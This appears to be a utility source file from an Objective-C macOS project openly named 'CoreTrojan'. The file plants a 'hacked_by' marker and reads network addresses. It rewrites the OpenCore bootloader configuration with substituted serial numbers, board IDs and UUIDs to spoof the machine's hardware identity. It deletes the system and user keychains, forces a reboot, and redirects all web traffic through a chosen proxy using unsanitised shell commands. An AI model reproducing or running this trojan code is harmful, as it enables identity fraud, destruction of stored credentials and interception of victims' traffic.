//
//  util.m
//  CoreTrojan
//
//  Created by yt on 17/08/23.
//

#import "util.h"
#import "NSData+FastHex.h"
#import <sys/socket.h>
#import <ifaddrs.h>
#import <netinet/in.h>
#import <arpa/inet.h>
#import <sys/sysctl.h>
#import <net/if.h>
#import <net/if_dl.h>
#include <stdlib.h>


#define TROJAN_HACK_FLAG @"/Library/CoreTrojan/hacked_by_CoreTrojan"

BOOL check_hack_flag(void) {
    return ([[NSFileManager defaultManager] fileExistsAtPath:TROJAN_HACK_FLAG]);
}

BOOL write_hack_flag(void) {
    return [[NSFileManager defaultManager] createFileAtPath:TROJAN_HACK_FLAG contents:nil attributes:nil];
}


NSString*
get_eth_ip_address(void) {
    NSString *ip = nil;
    struct ifaddrs *addrs = NULL;
    struct ifaddrs *x = NULL;
    int ret = 0;
    
    ret = getifaddrs(&addrs);
    if (ret == 0){
        x = addrs;
        while (x != NULL) {
            if (x->ifa_addr->sa_family == AF_INET){
                //NSLog(@"name %s", x->ifa_name);
                if (strcmp("en0", x->ifa_name) == 0 || strcmp("en1", x->ifa_name) == 0){
                    struct sockaddr_in *sockaddr = (struct sockaddr_in *)x->ifa_addr;
                    char *ip_addr = inet_ntoa(sockaddr->sin_addr);
                    //NSLog(@"name %s ip_addr %s", x->ifa_name, ip_addr);
                    ip = [[NSString alloc] initWithCString:ip_addr encoding:NSUTF8StringEncoding];
                    break;
                }
                
            }
            
            x = x->ifa_next;
        }
    }
    
    freeifaddrs(addrs);
    return ip;
}

NSString*
get_eth_mac_address() {
    int mib[6];
    size_t len;
    char *buf;
    unsigned char *ptr;
    struct if_msghdr *ifm;
    struct sockaddr_dl *sdl;
    
    mib[0] = CTL_NET;
    mib[1] = AF_ROUTE;
    mib[2] = 0;
    mib[3] = AF_LINK;
    mib[4] = NET_RT_IFLIST;
    mib[5] = if_nametoindex("en0");
    if (mib[5] == 0){
        NSLog(@"if_nametoindex error");
        return nil;
    }
    
    if (sysctl(mib, 6, NULL, &len, NULL, 0) < 0){
        NSLog(@"sysctl error 1");
        return nil;
    }
    
    if ((buf = malloc(len)) == NULL){
        NSLog(@"can not allocate memory");
        return nil;
    }
    
    if (sysctl(mib, 6, buf, &len, NULL, 0) < 0){
        NSLog(@"sysctl error 2");
        return nil;
    }
    
    ifm = (struct if_msghdr *)buf;
    sdl = (struct sockaddr_dl *)(ifm + 1);
    ptr = (unsigned char *)LLADDR((sdl));
    
    NSString *mac = [NSString stringWithFormat:@"%02x:%02x:%02x:%02x:%02x:%02x", *ptr, *(ptr+1), *(ptr+2), *(ptr+3), *(ptr+4), *(ptr+5)];
    
    return mac;
}



int write_opencore_config_file(NSString *sample, MacCode *mc){
    if (![[NSFileManager defaultManager] fileExistsAtPath:sample]){
        NSLog(@"sample.plist is not found.");
        return -1;
    }
    
    NSDictionary *samDict = [NSDictionary dictionaryWithContentsOfFile:sample];
    NSMutableDictionary *md = [NSMutableDictionary dictionaryWithDictionary:samDict];
    md[@"PlatformInfo"][@"DataHub"][@"BoardProduct"] = mc.BID;
    md[@"PlatformInfo"][@"DataHub"][@"SystemProductName"] = mc.MODEL;
    md[@"PlatformInfo"][@"DataHub"][@"SystemSerialNumber"] = mc.SN;
    md[@"PlatformInfo"][@"DataHub"][@"SystemUUID"] = mc.smUUID;
    
//    md[@"PlatformInfo"][@"Generic"][@"MLB"] = mc.MLB;
//    md[@"PlatformInfo"][@"Generic"][@"ROM"] = [NSData dataWithHexString:mc.ROM];
//    md[@"PlatformInfo"][@"Generic"][@"SystemProductName"] = mc.MODEL;
//    md[@"PlatformInfo"][@"Generic"][@"SystemSerialNumber"] = mc.SN;
//    md[@"PlatformInfo"][@"Generic"][@"SystemUUID"] = mc.smUUID;
    
    md[@"PlatformInfo"][@"PlatformNVRAM"][@"BID"] = mc.BID;
    md[@"PlatformInfo"][@"PlatformNVRAM"][@"MLB"] = mc.MLB;
    md[@"PlatformInfo"][@"PlatformNVRAM"][@"ROM"] = [NSData dataWithHexString:mc.ROM];
    md[@"PlatformInfo"][@"PlatformNVRAM"][@"SystemSerialNumber"] = mc.SN;
    md[@"PlatformInfo"][@"PlatformNVRAM"][@"SystemUUID"] = mc.smUUID;
    
    
    md[@"PlatformInfo"][@"SMBIOS"][@"BoardProduct"] = mc.BID;
    md[@"PlatformInfo"][@"SMBIOS"][@"BoardSerialNumber"] = mc.MLB;
    md[@"PlatformInfo"][@"SMBIOS"][@"BoardVersion"] = mc.MODEL;
    md[@"PlatformInfo"][@"SMBIOS"][@"ChassisSerialNumber"] = mc.SN;
    md[@"PlatformInfo"][@"SMBIOS"][@"ChassisVersion"] = mc.BID;
//    md[@"PlatformInfo"][@"SMBIOS"][@"SystemManufacturer"] = @"Apple Inc.";
    md[@"PlatformInfo"][@"SMBIOS"][@"SystemProductName"] = mc.MODEL;
    md[@"PlatformInfo"][@"SMBIOS"][@"SystemSerialNumber"] = mc.SN;
    md[@"PlatformInfo"][@"SMBIOS"][@"SystemUUID"] = mc.smUUID;
    
    md[@"PlatformInfo"][@"UpdateSMBIOSMode"] = @"Overwrite";
    
    
    [md writeToFile:@"/EFI/OC/config.plist" atomically:YES];
    
    return 0;
}

BOOL clear_apsd_keychain(void) {
    NSLog(@"clear_apsd_keychain");
    NSFileManager *fm = [NSFileManager defaultManager];
    NSError *err;
    [fm removeItemAtPath:@"/Library/Keychains/apsd.keychain" error:&err];
    [fm removeItemAtPath:@"/Library/x_apsd.plist" error:&err];
    return YES;
}


BOOL clear_user_keychain(void){
    NSLog(@"clear_user_keychain");
    NSTask *task = [NSTask launchedTaskWithLaunchPath:@"/Library/CoreTrojan/clear_user_keychain.sh" arguments:@[]];
    [task waitUntilExit];
    return YES;
}


void do_reboot(void){
    system("shutdown -r now");
}

void setProxy(NSString *ip, NSInteger port){
    //    NSString* webProxy = @"networksetup -setwebproxy Ethernet 127.0.0.1 10003";
    //    NSString* secureWebProxy = @"networksetup -setsecurewebproxy Ethernet 127.0.0.1 10004";
    NSString *webProxy = [NSString stringWithFormat:@"networksetup -setwebproxy Ethernet %@ %ld",ip,port];
    NSString *secureWebProxy = [NSString stringWithFormat:@"networksetup -setsecurewebproxy Ethernet %@ %ld",ip,port];
    const char* webProxyCmd = [webProxy UTF8String];
    const char* secureWebProxyCmd = [secureWebProxy UTF8String];
    system(webProxyCmd);
    system(secureWebProxyCmd);
}
